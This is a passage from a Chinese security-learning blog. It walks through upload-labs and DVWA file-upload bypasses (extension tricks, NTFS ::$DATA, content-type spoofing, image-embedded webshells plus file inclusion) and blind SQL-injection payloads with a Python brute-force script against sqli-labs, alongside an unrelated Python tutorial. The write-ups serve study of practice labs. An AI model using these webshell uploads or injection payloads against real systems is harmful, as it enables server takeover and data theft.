array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 还是采用了黑名单来进行限制，不过与前几关先比较会发现少了这一行代码 1$file_ext = trim($file_ext); //首尾去空 那么就可以采用后缀名中加空绕过在后缀名中加入空格.php空格，再发包，上传成功 方法：后缀名加空绕过 第七关查看源码 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 还是黑名单，这次又有什么不一样的，通过与前几关对比发现少了这行代码 1$file_name = deldot($file_name);//删除文件名末尾的点 所以可以采用后缀名加.的方式绕过，在这之前，先来了解一下对Windows系统文件命名规则的特殊利用 1234567891011 shell.php. ———-文件名后加点‘.’ shell.php(空格) ———-文件名后加括号空格 shell.php:1.jpg ———-文件名后加冒号’:’ shell.php::$DATA ———-文件名后加NTFS ADS特性::$DATA shell.php::$DATA…… ———-文件名后::$DATA……会被windows系统自动去掉不符合规则符号后面的内容。 windows系统文件命名规则的特殊利用 因此我们可以先抓包然后在后缀名后加上.，文件上传时由于不符合windows文件命名规则而将.去掉，从而将.php的文件上传进去 访问绕过方法：后缀名加.绕过 第八关查看源码 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 还是黑名单限制，观察一下与之前有那些不同 发现少了这一段代码1$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 没有去除字符串::$DATA，根据Windows系统文件命名规则进行抓包修改即可1shell.php::$DATA ———-文件名后加NTFS ADS特性::$DATA 原理和第七关类似访问成功绕过方法：后缀名加::$DATA绕过 第九关查看源码 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 观察看与前几关的代码有什么不同的地方，发现1$img_path = UPLOAD_PATH.'/'.$file_name; 路径拼接的是处理后的文件名$file_name，而不是$file_ext，也就是说最后保存文件的时候没有重命名而使用的原始的文件名，那相当于$file_name只经过那两段代码的过滤12$file_name = trim($_FILES['upload_file']['name']);//移除字符串两侧的空白字符$file_name = deldot($file_name);//删除文件名末尾的点 那就可以采用后缀名（点+空格+点）的方法来绕过上传时，代码会先将末尾的.去除，剩余.+空格，利用Windows系统文件命名规则，windows会忽略文件末尾的.和空格，这样即可上传进取 绕过方法：后缀名+.+空格+.进行绕过 第十关查看源码 123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;#str_ireplace() 函数替换字符串中的一些字符（不区分大小写）/*str_ireplace(find,replace,string,count)find 必需。规定要查找的值。replace 必需。规定替换 find 中的值的值。string 必需。规定被搜索的字符串。*/ 这一段代码将后缀名全部替换成了空1$file_name = str_ireplace($deny_ext,\"\", $file_name); 之前学习XSS时也碰到这种情况，可以采用双写进行绕过过滤了php，前后再拼接成PHP访问成功： 绕过方法：双写绕过 总结：通过这十关又学到了很多文件上传的技巧，下次继续学习后十关，这次先学习到这里。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://bealright.github.io/tags/文件上传/"}]},{"title":"文件上传漏洞——DVWA练习","slug":"文件上传漏洞——DVWA练习","date":"2019-07-31T12:01:24.000Z","updated":"2019-08-07T03:28:54.618Z","comments":true,"path":"2019/07/31/文件上传漏洞——DVWA练习/","link":"","permalink":"http://bealright.github.io/2019/07/31/文件上传漏洞——DVWA练习/","excerpt":"","text":"前言：文件上传漏洞是很常见的漏洞，也非常有趣，接下来就在DVWA靶场中边学边练。 文件上传漏洞： 文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 具体的原理可以看大师傅的讲解Smi1e_——文件上传漏洞 学习笔记文件上传漏洞 low级别观察源码 12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );# $_FILES[\"file\"][\"name\"] - 被上传文件的名称# $_FILES[\"file\"][\"tmp_name\"] - 存储在服务器的文件的临时副本的名称# basename() 函数返回路径中的文件名部分 // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; # move_uploaded_file() 函数将上传的文件移动到新位置 // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125;&#125;?&gt; 通过对源码的分析，我们发现没有任何防护和限制，那就构造一句话木马进行上传根据相应的路径进行菜刀连接即可 Medium级别上传刚才一句话木马试一下，发现只能上传JPG或者是PNG，那就来查看一下源码 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; 通过分析源码，发现只有这一段代码进行了限制 12if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) 只能上传jpeg或png的图像，限制了大小，其他没有任何防护，那就可以用一句话木马图片 一句话木马图片的制作一、建立一个bat文件，用记事本打开输入cmd二、将上传的图片和一句话php文件执行以下命令即可1copy 图片1.jpg/b+PHP文件2.php/a 自定义图片名3.jpg 发现一句话确实已经插入图片中上传成功，用菜刀连接结果连接不上去，这里我们上传的是一张图片，那对方服务器就认为我们上传的是一张很正常的图，因此只会当做图片来解析，所以图片里的php代码不会被解析了，这里需要了解文件包含漏洞才能将图片进行解析。因为文件包含漏洞也是很好玩的知识，这里就不详细写了，之后单独总结出一篇博客来学习文件包含漏洞 我这里上传的是3.jpg在url地址栏中输入1http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file://D:\\PHPstudy\\PHPTutorial\\WWW\\DVWA\\hackable\\uploads\\3.jpg 发现图片已经被解析了，那么PHP代码也肯定被服务器解析了，用菜刀进行连接结果还是连不上去，发现有三行警告 警告：无法修改头信息 做到这里实在连不上去，不知道是什么原因，这种方法就暂时先留到这，等找到解决方法了再继续做 除下这种方法还可以用抓包修改文件的type通过观察这两段代码 12if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; 只是限制了Content-Type，没有限制后缀名，所以这里可以直接抓包修改Content-Type即可发包，上传成功访问成功这里为了方便就不连接菜刀了，将一句话木马改为1&lt;?php phpinfo(); ?&gt; High级别查看源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;#$_FILES['myFile']['name'] 显示客户端文件的原名称。#$_FILES['myFile']['type'] 文件的 MIME 类型，例如\"image/gif\"。#$_FILES['myFile']['size'] 已上传文件的大小，单位为字节。#$_FILES['myFile']['tmp_name'] 储存的临时文件名，一般是系统默认。#$_FILES['myFile']['error'] 该文件上传相关的错误代码。以下为不同代码代表的意思：#strtolower() 函数把字符串转换为小写#getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。#strrpos() 函数查找字符串在另一字符串中最后一次出现的位置?&gt; 观察源码发现，代码中增加了一段代码1$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 并且修改了这一段代码 123if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) 先来解读一下第一段代码，strrpos()函数查找.出现在$uploaded_name的位置然后加1，再利用substr()函数从变量$uploaded_name的指定位置截取部分字符串。所以这段代码的作用就是为了截取上传文件的后缀名 第二段代码，strtolower()函数将无论是大写或小写的后缀名全改为小写，以防大小写绕过，并且getimagesize() 函数用于获取图像大小及相关信息，所以这里再用之前的php文件后缀名改为jpg或png就不可行了，不过也可以利用这个函数的漏洞进行绕过，既然对文件的开头内容进行了检测并且通过二进制识别是否为图像，那么就可以利用文件头欺骗，来让getimagesize()函数检测无效。 先了解一下常用图片的文件头标识通过文件头标识判断图片格式文件头欺骗 getimagesize() 函数在这里作用就是检测是否为图像的作用，这里就用最简便的GIF的文件头，在一句话木马前加上GIF的文件头标识上传上传成功，说明成功绕过 用文件包含来进行访问1http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file:///D:\\phpStudy1\\PHPTutorial\\WWW\\DVWA\\hackable\\uploads\\2.jpg 但应该是我配置有问题，我的文件包含报错，但这种方法没错 除此之外那，也可以上传图片马，然后用文件包含进行解析，由于我这里配置的有问题就不再演示了，不过这种方法确实是可行的，看过许多大师傅们都是这样做的，除了这几种方法外，还有%00截断，这个方法也不在这里演示了，因为是适用于php小于 5.3.4 版本。 总结：虽然遇到了很多问题，不过也初步了解了文件上传漏洞的原理和一些姿势，接下来通过Upload-labs进行学习。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://bealright.github.io/tags/文件上传/"}]},{"title":"python学习（字典、用户输入和while循环）","slug":"python学习（字典、用户输入和while循环）","date":"2019-07-29T11:22:21.000Z","updated":"2019-08-01T01:00:02.161Z","comments":true,"path":"2019/07/29/python学习（字典、用户输入和while循环）/","link":"","permalink":"http://bealright.github.io/2019/07/29/python学习（字典、用户输入和while循环）/","excerpt":"","text":"前言：上次学习到了if语句，这次接着进行学习。 字典 字典能够准确地为各种真实物体建模，且能够将相关信息关联起来。 使用字典 字典是一系列的键——值对，一个建对应一个值，值可以为数字、字符串等在Python中，字典用放在花括号{} 中的一系列键—值对表示。 访问字典中的值1234567score = &#123;'shuxu':'80','yuwen':'90'&#125;print(score['shuxu'])print(score['yuwen'])#输出结果：8090 添加键——值对 字典是一种动态结构，可随时在其中添加键—值对添加时值用方括号[]括起来 12345678910score = &#123;'shuxu':'80','yuwen':'90'&#125;print(score)score['wuli'] = 60score['yingyu'] = 90print(score)#输出结果：&#123;'shuxu': '80', 'yuwen': '90'&#125;&#123;'shuxu': '80', 'yuwen': '90', 'wuli': 60, 'yingyu': 90&#125; 创建一个空字典1234567score = &#123;&#125;score['wuli'] = 60score['yingyu'] = 90print(score)#输出结果：&#123;'wuli': 60, 'yingyu': 90&#125; 修改字典中的值1234567score = &#123;'yuwen':'80'&#125;print(score)score['yuwen'] = '90'print(score)#输出结果：&#123;'yuwen': '80'&#125;&#123;'yuwen': '90'&#125; 删除键——值对 使用del 语句可以将相应的键—值对彻底删除，使用del 语句时，必须指定字典名和要删除的键。 1234567score = &#123;'yuwen':80,'shuxu':90&#125;print(score)del score['shuxu']print(score)#输出结果：&#123;'yuwen': 80, 'shuxu': 90&#125;&#123;'yuwen': 80&#125; 由类似对象组成的字典如果用字典来存储众多对象的同一种信息，可以用这样的形式 12345678910yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'60', &#125;print(\"he score is\"+ yuwen_score['he'])#输出结果：he score is70 遍历所有的键——值对 遍历键值——对时，可声明两个变量，用于存储键—值对中的键和值。对于这两个变量，可使用任何名称。12345678910111213141516171819202122yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'60', &#125;for key,value in yuwen_score.items(): print(\"\\nkey: \" + key) print(\"value: \" + value)#items() 函数以列表返回可遍历的(键, 值) 元组数组。#输出结果：key: mevalue: 90key: youvalue: 80key: hevalue: 70key: shevalue: 60 遍历字典中的所有键 keys() 函数返回一个列表包含所有键 12345678910111213141516yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'60', &#125;for key in yuwen_score.keys(): print(\"\\nkey: \" + key)#输出结果：key: mekey: youkey: hekey: she 按顺序遍历字典中的所有值 函数sorted() 来获得按特定顺序排列的键列表的副本 12345678910111213141516yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'60', &#125;for key in sorted(yuwen_score.keys()): print(\"\\nkey: \" + key)#输出结果：key: hekey: mekey: shekey: you 遍历字典中的所有值 方法values() ，返回一个值列表，不包含任何键。 12345678910111213141516yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'60', &#125;for score in yuwen_score.values(): print(\"\\nscore: \" + score)#输出结果：score: 90score: 80score: 70score: 60 如果值中有重复的，可以用集合set，如： 1234567891011121314yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'90', &#125;for score in set(yuwen_score.values()): print(\"\\nscore: \" + score)#输出结果：score: 90score: 80score: 70 嵌套 将一系列字典存储在列表中，或将列表作为值存储在字典中，这称为嵌套 字典列表123456789101112score_0 = &#123;'subject':'yuwen','point':60&#125;score_1 = &#123;'subject':'shuxu','point':70&#125;score_2 = &#123;'subject':'yingyu','point':80&#125;scores = [score_0,score_1,score_2]for score in scores: print(score)#输出结果：&#123;'subject': 'yuwen', 'point': 60&#125;&#123;'subject': 'shuxu', 'point': 70&#125;&#123;'subject': 'yingyu', 'point': 80&#125; 在字典中储存列表 每当需要在字典中将一个键关联到多个值时，都可以在字典中嵌套一个列表。 123456789101112school = &#123; 'teacher': 'wang', 'subjects': ['shuxu','yuwen'], &#125;print(school['teacher'])for subject in school['subjects']: print(\"\\t\" + subject)#输出结果：wang shuxu yuwen 用户输入和while循环函数input 函数input() 让程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其存储在一个变量中。使用函数input() 时，输入解读为字符串。 123456message = input(\"please input message:\\n\")print(\"message is:\"+message)#输出结果：please input message:22222message is:22222 函数int 使用函数int() 来获取数值输入 ,input（）解读的为字符串，不能直接和整数比较 将数值输入用于计算和比较前，需将其转换为数值表示. 求模运算符 %，将两个数相除并返回余数 1234567print(4 % 3)print(5 % 3)print(6 % 3)#输出结果:120 使用while 循环 通过一个例子来了解while的语法 12345678910number = 1while number &lt;= 5: print(number) number +=1#输出结果：12345 在循环中使用continue 返回到循环开头，并根据条件测试结果决定是否继续执行循环 12345678910111213number = 0while number &lt;10: number += 1 if number % 2 ==0: continue print(number) #输出结果： 13579 在列表之间移动元素12345678910111213numbers = ['a','b','c']confirmed_numbers = []while numbers: middle_number = numbers.pop()#删除末尾赋给新的变量 confirmed_numbers.append(middle_number)for confirmed_number in confirmed_numbers: print(confirmed_number.title())#输出结果：CBA 删除包含特定值的所有列表元素12345678910messages = ['a','b','c','d','a','a']print(messages)while 'a' in messages: messages.remove('a')print(messages)#输出结果：['a', 'b', 'c', 'd', 'a', 'a']['b', 'c', 'd'] 使用用户输入来填充字典 12345678910111213141516171819202122#创建一个空字典responses = &#123;&#125;#设置一个标志active = Truewhile active: name = input(\"\\nWhat is your name?\") like_food = input(\"your like food is ?\") #将答案存储在字典中 responses[name] = like_food repeat = input(\"Would you like to let another person respond? (yes/ no) \") if repeat =='no': active = Falsefor name,like_food in responses.items(): print(name+\":\"+like_food)#输出结果：What is your name?222your like food is ?222Would you like to let another person respond? (yes/ no) no222:222 这次就先学习到这，下次继续学习。","categories":[{"name":"编程语言学习","slug":"编程语言学习","permalink":"http://bealright.github.io/categories/编程语言学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://bealright.github.io/tags/python/"}]},{"title":"sql注入学习——时间盲注","slug":"sql注入学习——时间盲注","date":"2019-07-25T12:01:24.000Z","updated":"2019-07-28T07:45:15.179Z","comments":true,"path":"2019/07/25/sql注入学习——时间盲注/","link":"","permalink":"http://bealright.github.io/2019/07/25/sql注入学习——时间盲注/","excerpt":"","text":"前言：之前通过前九关学习到了回显注入、报错注入、布尔盲注等一些方法，这次就来详细的学习时间盲注。 在上一篇博客中，了解了布尔盲注，其实布尔盲注和时间盲注大致相同，注入原理是一致的，区别就是一个还是有回显的，一个彻底没有回显，通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注。 先来学习一下时间盲注所需要的函数123sleep()/延迟函数if(condition,true,false)/若条件为真 返回true，若条件为假 返回falsesubstring(\"string\",strart,length) 主要的也就是这几个了，下面就通过sqli-labs第十关来练习时间盲注 猜测数据库名长度payload：1?id=1\" and if(length(database())&gt;5,1,sleep(10))--+ 这里执行失败的话将睡十秒，能更快的判断，当然也可以将sleep()函数，放在执行成功的位置。 根据浏览器的反应来判断出数据库名长度（如果是手动注入的话切记网速得好，要不然就好玩了。。。）爆出数据库名payload： 1?id=1\" and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+ 根据浏览器的反应，来猜测出数据库名，其实时间注入就是比布尔盲注多了一个if函数，sleep()函数就相当于布尔盲注中的true或false，其他语句大致都相同。 爆表名payload:1?id=1\" and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+ 同样也是观察浏览器反应时间，如果没有睡10秒则表名条件正确，继续尝试 爆列名payload:1?id=1\" and if((ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))))&gt;100,1,sleep(10))--+ 爆值payload：1?id=1\" and if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+ 可以看出其实时间盲注和布尔盲注语句基本相同，只不过是时间盲注通过if语句来执行sleep函数，从而判断。如果理解了布尔盲注，时间盲注也很好理解。 但还是最好写一下脚本，手工注入效率低且容易出错。这次就先学习到这里，了解了时间盲注，等到脚本能力提高了，自己写出一个脚本跑一下。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://bealright.github.io/tags/SQL注入/"}]},{"title":"sql注入学习——布尔盲注","slug":"sql注入学习——布尔盲注","date":"2019-07-24T12:01:24.000Z","updated":"2019-07-27T02:57:35.609Z","comments":true,"path":"2019/07/24/sql注入学习——布尔盲注/","link":"","permalink":"http://bealright.github.io/2019/07/24/sql注入学习——布尔盲注/","excerpt":"","text":"前言：之前通过前九关学习到了回显注入、报错注入等一些方法，这次就来详细的学习布尔盲注。 首先来了解一下盲注的概念 盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。 布尔盲注 原理：注入的时候只会返回True和False，所以布尔盲注就是根据页面显示的是True还是False进行猜测数据库中的信息。 布尔盲注需要几个函数的辅助，就先来了解一下这几个函数1234length()函数可返回字符串的长度substring()函数可以截取字符串，可指定开始的位置和截取的长度ord()函数可以返回单个字符的ASCII码char()函数可将ASCII码转换为对应的字符 具体的用法可以参考大佬的博客Mysql语法介绍，接下来就通过sql-labs练习布尔盲注。 判断注入点（也就是闭合符号）发现输入id=1&#39;会报错1http://127.0.0.1/sqli-labs-master/Less-8/?id=1' 在id=1&#39;后再加上注释符号后又回显正确，所以判定闭合符号为&#39; 爆数据库长度知道闭合符号后，先来爆一下数据库名的长度，这里就用到上面所说的函数了1http://127.0.0.1/sqli-labs-master/Less-8/?id=1' and length(database())&gt;1 --+ 回显正确手工注入的话就要一遍一遍的试试，将后面的长度不断增大，最后得出数据库名的长度为8 爆数据库名知道了数据库名的长度，接下来就来爆破数据库名1Less-8/?id=1' and ord(substr(database(),1,1))&gt;99 --+ 1Less-8/?id=1' and ascii(substr((database()),1,1)) &gt; 99 --+ 1Less-8/?id=1' and ascii(substr((database()),1,1)) = 99 --+ 原理都一样，目的就是取出数据库名中的一个字符通过比较ascii码来猜测出数据库名，但是如果手动爆的话太浪费时间了，可以写脚本，也可以用burp爆破，这里两种方法都试一下 burp爆破先抓包设置变量，这里设置了两个变量所以上面的框中要选第四个选项第一个变量设置为numbers 1到8，第二个变量也设置为numbers 0到127分别设置好，然后开始爆破。不过太慢了，应该是我burp设置的有问题，这里就学习一下这种方法，爆破还是脚本来吧。附上大佬博客利用burp盲注 脚本爆破目前脚本还不会写，就参考大佬的学习一下大佬博客布尔盲注脚本中一些不太懂的语法就参考下面大佬的博客Python requestsPython——入门级(定义功能def函数)格式化输出字符串 1234567891011121314151617181920212223242526272829303132import requestsdef database_len(): for i in range(1,10): url = '''http://127.0.0.1/sqli-labs-master/Less-8/index.php''' payload = '''?id=1' and length(database())&gt;%s''' %i #格式化输出字符串 # print(url+payload+'%23') r = requests.get(url+payload+'%23') if 'You are in' in r.text: print(i) else: #print('false') print('database_length:',i) breakdatabase_len() def database_name(): name = '' for j in range(1,9): for i in 'sqcwertyuioplkjhgfdazxvbnm': url = \"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and substr(database(),%d,1)='%s'\" %(j,i) # print(url+'%23') r = requests.get(url+'%23') if 'You are in' in r.text: name = name+i print(name) break print('database_name:',name)database_name() 爆出了数据库名和长度，接下来改payload爆出表名payload：1?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;90 --+ 